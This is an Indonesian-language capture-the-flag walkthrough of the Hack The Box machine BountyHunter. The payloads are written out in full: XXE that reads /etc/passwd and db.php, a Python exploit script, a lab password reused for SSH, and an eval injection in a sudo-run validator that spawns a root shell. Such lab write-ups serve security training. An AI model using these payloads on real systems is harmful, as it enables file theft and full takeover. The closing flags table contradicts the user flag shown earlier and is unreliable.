---
title: "HackTheBox BountyHunter Walkthrough"
description: 'BountyHunter walkthrough focusing on exploiting an XXE vulnerability in a bug reporting form to achieve Remote Code Execution (RCE) and privilege escalation to root.'
date: 2025-02-16
tags: ["XXE Injection","Web Exploitation"]
image: '/public/static/htb-cover.jpg'
authors: ['chjwoo']
---

## Reconnaissance

Hal pertama yang harus kita lakukan adalah melakukan enumerasi open port menggunakan tools nmap, seperti berikut:

```bash
└─$ sudo nmap -sV -sC 10.10.11.100                                                    
[sudo] password for w1thre: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 09:20 WIB
Nmap scan report for 10.10.11.100
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect resu
```

### Analyze Scan Result

- Port 22, menjalakan service SSH dengan versi OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
- Port 80, menjalakan service http dengan versi Apache httpd 2.4.41 ((Ubuntu))

### Add host into /etc/hosts file

Hal ini untuk memudahkan kita dengan menggunakan nama domain bountyhunter.htb

```bash
└─$ sudo echo "10.10.11.100 bountyhunter.htb" | sudo tee -a /etc/hosts
10.10.11.100 bountyhunter.htb
```

### Accessing the Website

![image.png](image.png)

Link pada menu about dan contact merupakan bagian dari home page nya, sedangkan ketika kita akses ke menu portal.

![image.png](image%201.png)

Klik link tersebut akan mengarahkan kita ke /log_submit.php. yang isinya simple form untuk bug reporting.

![image.png](image%202.png)

Ketika diisi akan menampilkan report tersebut dan terdapat tulisan “If DB were ready, would have added”. 

### Enumerate Directory

Disini saya menggunakan feroxbuster untuk melakukan enumerasi directory.

```bash
└─$ feroxbuster -u http://bountyhunter.htb -x php
                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://bountyhunter.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      248l      761w    12807c http://bountyhunter.htb/assets/img/avataaars.svg
200      GET       64l      232w     2682c http://bountyhunter.htb/resources/lato.css
200      GET        5l       15w      125c http://bountyhunter.htb/portal.php
200      GET      150l      506w    43607c http://bountyhunter.htb/assets/img/portfolio/submarine.png
200      GET      122l      415w    30702c http://bountyhunter.htb/assets/img/portfolio/cake.png
200      GET        7l     1031w    84152c http://bountyhunter.htb/resources/bootstrap.bundle.min.js
301      GET        9l       28w      321c http://bountyhunter.htb/assets => http://bountyhunter.htb/assets/
301      GET        9l       28w      318c http://bountyhunter.htb/css => http://bountyhunter.htb/css/
200      GET        0l        0w        0c http://bountyhunter.htb/db.php
301      GET        9l       28w      324c http://bountyhunter.htb/resources => http://bountyhunter.htb/resources/
200      GET        6l       34w      210c http://bountyhunter.htb/resources/README.txt
200      GET        4l     1298w    86659c http://bountyhunter.htb/resources/jquery_login.min.js
200      GET        5l   108280w  1194961c http://bountyhunter.htb/resources/all.js
301      GET        9l       28w      317c http://bountyhunter.htb/js => http://bountyhunter.htb/js/
200      GET      388l     1470w    25169c http://bountyhunter.htb/index.php
200      GET       20l       63w      617c http://bountyhunter.htb/log_submit.php
200      GET        2l     1297w    89476c http://bountyhunter.htb/resources/jquery.min.js
200      GET       80l      248w     3228c http://bountyhunter.htb/resources/monsterat.css
200      GET      195l      683w    66699c http://bountyhunter.htb/assets/img/portfolio/cabin.png
200      GET      139l      444w    35267c http://bountyhunter.htb/assets/img/portfolio/safe.png
200      GET        1l       44w     2532c http://bountyhunter.htb/resources/jquery.easing.min.js
200      GET        8l       29w    28898c http://bountyhunter.htb/assets/img/favicon.ico
200      GET       69l      210w     2424c http://bountyhunter.htb/js/scripts.js
200      GET      151l      616w    50204c http://bountyhunter.htb/assets/img/portfolio/circus.png
200      GET      178l      601w    46744c http://bountyhunter.htb/assets/img/portfolio/game.png
200      GET    10240l    19373w   187375c http://bountyhunter.htb/css/styles.css
200      GET      388l     1470w    25169c http://bountyhunter.htb/
200      GET       24l       44w      594c http://bountyhunter.htb/resources/bountylog.js
200      GET        7l      567w    48945c http://bountyhunter.htb/resources/bootstrap_login.min.js
301      GET        9l       28w      325c http://bountyhunter.htb/assets/img => http://bountyhunter.htb/assets/img/
301      GET        9l       28w      335c http://bountyhunter.htb/assets/img/portfolio => http://bountyhunter.htb/assets/img/portfolio/
[###################>] - 36s   176838/180058  1s      found:31      errors:7      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_bountyhunter_htb-1739673262.state ...
[###################>] - 36s   176989/180058  1s      found:31      errors:7      
[############>-------] - 36s    18034/30000   500/s   http://bountyhunter.htb/ 
[##########>---------] - 34s    15300/30000   445/s   http://bountyhunter.htb/assets/ 
[###########>--------] - 34s    16665/30000   486/s   http://bountyhunter.htb/css/ 
[####################] - 4s     30000/30000   8301/s  http://bountyhunter.htb/resources/ => Directory listing (add --scan-dir-listings to scan)
[##########>---------] - 32s    15514/30000   480/s   http://bountyhunter.htb/js/ 
[########>-----------] - 29s    13053/30000   447/s   http://bountyhunter.htb/assets/img/ 
[######>-------------] - 24s     9812/30000   407/s   http://bountyhunter.htb/assets/img/portfolio/  
```

Terdapat hal yang menarik, yaitu db.php.

## Foothold

### Analyze Request using Burpsuite

Kita kembali lagi untuk menganalisis request form bug report dengan menggunakan Burpsuite

```bash
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: bountyhunter.htb
Content-Length: 215
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Origin: http://bountyhunter.htb
Referer: http://bountyhunter.htb/log_submit.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50ZXN0PC90aXRsZT4KCQk8Y3dlPmFzZDwvY3dlPgoJCTxjdnNzPjEuMTwvY3Zzcz4KCQk8cmV3YXJkPjEwMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
```

Disini data di encode menggunakan base64 dan url encoding. Ketika kita lakukan decode maka hasilnya akan seperti ini.

```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>test</title>
		<cwe>asd</cwe>
		<cvss>1.1</cvss>
		<reward>1000</reward>
		</bugreport>
```

Hasil nya merupakan XML, disini kita bisa coba melakukan exploitasi menggunakan XXE

> **XXE injection (XML Eternal Entity Injection) yaitu kerentanan dimana attacker dapat mengubah pemrosesan data menjadi sebuah injeksi code dimana nantinya umumnya akan menghasilkan output file internal dari dalam server**.

[https://www.nakanosec.com/2022/08/belajar-exploitasi-xxe-injection-xml.html](https://www.nakanosec.com/2022/08/belajar-exploitasi-xxe-injection-xml.html)
> 

Langsung saja, siapkan payload seperti berikut:

```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>asd</cwe>
		<cvss>1.1</cvss>
		<reward>1000</reward>
		</bugreport>
```

Dan jangan lupa untuk merubahnya ke base64 lalu di url encode.

![image.png](image%203.png)

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Yup! kita bisa menggunakan XXE Injection, kita berhasil mendapatkan file /etc/passwd. Disini saya membuat script untuk payload agar mempermudah kita. Kita coba untuk melakukan akses ke file db.php

### Explaination of Script

```bash
import requests
import sys
from base64 import b64encode, b64decode

URL = "http://bountyhunter.htb/tracker_diRbPr00f314.php"

xxe = f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE data [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
            <bugreport>
            <title>&xxe;</title>
            <cwe>asd</cwe>
            <cvss>1.1</cvss>
            <reward>1000</reward>
            </bugreport>"""

payload = b64encode(xxe.encode())

response = requests.post(
    URL, 
    data = {'data': payload})

encoded_result = '>'.join(response.text.split('>')[5:-21])[:-4]
result = b64decode(encoded_result)
print(result.decode())  
```

| **Baris Kode** | **Penjelasan** |
| --- | --- |
| `import requests` | Mengimpor library `requests` untuk melakukan HTTP request. |
| `import sys` | Mengimpor `sys`, meskipun tidak digunakan dalam script ini. |
| `from base64 import b64encode, b64decode` | Mengimpor fungsi `b64encode` dan `b64decode` untuk encoding dan decoding Base64. |
| `URL = "<http://bountyhunter.htb/tracker_diRbPr00f314.php>"` | Menetapkan target URL yang akan dieksploitasi. |
| **XXE Payload:** |  |
| `python xxe = f"""<?xml version="1.0" encoding="ISO-8859-1"?>` | Mendefinisikan XML yang akan dikirim sebagai input. |
| `python <!DOCTYPE data [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>` | Membuat XXE (XML External Entity) yang membaca `db.php`, lalu mengonversinya ke Base64 menggunakan `php://filter/convert.base64-encode/resource=`. |
| `python <bugreport> <title>&xxe;</title> <cwe>asd</cwe> <cvss>1.1</cvss> <reward>1000</reward> </bugreport>"""` | Struktur XML yang mengandung `&xxe;`, yang akan digantikan dengan isi file `db.php`. |
| `payload = b64encode(xxe.encode())` | Mengonversi payload XML menjadi Base64 agar dapat dikirim dengan aman. |
| **Mengirimkan Request:** |  |
| `python response = requests.post( URL, data={'data': payload})` | Mengirimkan HTTP POST request ke target dengan payload XXE yang telah dienkode. |
| **Memproses Respon:** |  |
| `python encoded_result = '>'.join(response.text.split('>')[5:-21])[:-4]` | String formatting |
| `python result = b64decode(encoded_result)` | Melakukan decode Base64 dari hasil response untuk mendapatkan konten asli file `db.php`. |
| `python print(result.decode())` | Mencetak hasil file `db.php` yang telah di decode. |

Maka output dari file tersebut adalah

```bash
└─$ python solver.py
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

Disini kita mendapatkan credentials. Kembali ke file /etc/passwd kita bisa login menggunakan akun development

```bash
development:x:1000:1000:Development:/home/development:/bin/bash
```

Langsung saja kita gunakan SSH untuk login dengan password yang sudah kita dapatkan.

```bash
└─$ ssh development@bountyhunter.htb                                  
The authenticity of host 'bountyhunter.htb (10.10.11.100)' can't be established.
ED25519 key fingerprint is SHA256:p7RCN4B2AtB69d0vE1LTmg0lRRlnsR1fxArJ+KNoNFQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bountyhunter.htb' (ED25519) to the list of known hosts.
development@bountyhunter.htb's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 16 Feb 2025 02:58:14 AM UTC

  System load:  0.0               Processes:             213
  Usage of /:   24.1% of 6.83GB   Users logged in:       0
  Memory usage: 15%               IPv4 address for eth0: 10.10.11.100
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
development@bountyhunter:~$ 

```

Kita sudah berhasil login. Untuk flag usernya ada di /home/development. Dan terdapat 1 file lagi yaitu contract.txt

```bash
development@bountyhunter:~$ ls
contract.txt  user.txt
development@bountyhunter:~$ cat user.txt
80392ea844e758f121d40d0afc6f5b4c
development@bountyhunter:~$ cat contract.txt
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
development@bountyhunter:~$ 
```

## Privilege Escalation

Langkah selanjutnya kita harus melakukan privilege escalation menjadi root. Pertama kita cek dulu sudo -l yang digunakan untuk **menampilkan daftar perintah yang dapat dijalankan dengan sudo oleh user saat ini** tanpa memerlukan password.

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

```

Disini user dapat menggunakan script [ticketValidator.py](http://ticketValidator.py) dengan hak akses root tanpa menggunakan password. Dalam script tersebut, akan melakukan parsing markdown dan melakukan validasi input di dalamnya.

```bash
development@bountyhunter:/opt/skytrain_inc$ cat ticketValidator.py 
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Disini terdapat 4 invalid ticket, salah satunya seperti ini:

```bash
development@bountyhunter:/opt/skytrain_inc$ ls invalid_tickets/
390681613.md  529582686.md  600939065.md  734485704.md
development@bountyhunter:/opt/skytrain_inc$ cat invalid_tickets/390681613.md 
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket

```

Kembali lagi ke script, disini terdapat eval yang nantinya bisa kita gunakan sebagai attack vector.

Tapi kita harus craft valid scriptnya terlebih dahulu.

- Baris pertama dimulai dengan “”# Skytrain Inc”
- Baris kedua dimulai dengan “## Ticket to”
- Harus ada baris yang dimulai dengan “__Ticket Code:__”
- Baris setelah baris kode tiket harus dimulai dengan “****”**
- Teks setelah **“****” hingga “+” pertama harus berupa int yang jika dibagi dengan 7 memiliki sisa 4.

Jika semua syarat tersebut terpenuhi, maka baris tersebut (dengan “**” yang telah dihapus) akan diteruskan ke eval. Maka berikut adalah markdown yang valid

```bash
# Skytrain Inc
## Ticket to Jakarta
__Ticket Code:__
**32+110+43**
##Issued: 2025/02/16
#End Ticket
```

Kita bisa membuat valid markdown di home development directory.

```bash
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
/home/development/mark.md
Destination: Jakarta
Valid ticket.
```

Disini ticket adalah valid. Kita bisa melakukan inject terhadap function eval dengan memasukkan script seperti berikut di file markdown yang valid.

```bash
# Skytrain Inc
## Ticket to Jakarta
__Ticket Code:__
**32+110+43+ __import__('os').system('/bin/bash')**
##Issued: 2025/02/16
#End Ticket

```

Dan ketika dijalankan, kita sudah berhasil melakukan privilege escalation menjadi root!

```bash
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
/home/development/mark.md
Destination: Jakarta
root@bountyhunter:/home/development# whoami
root
root@bountyhunter:/home/development# cat /root/root.txt 
5d8405d736e4d7e365cc0b7be18e6cbf
root@bountyhunter:/home/development# 
```

## Flags

| user.txt | 5d8405d736e4d7e365cc0b7be18e6cbf |
| --- | --- |
| root.txt | 5d8405d736e4d7e365cc0b7be18e6cbf |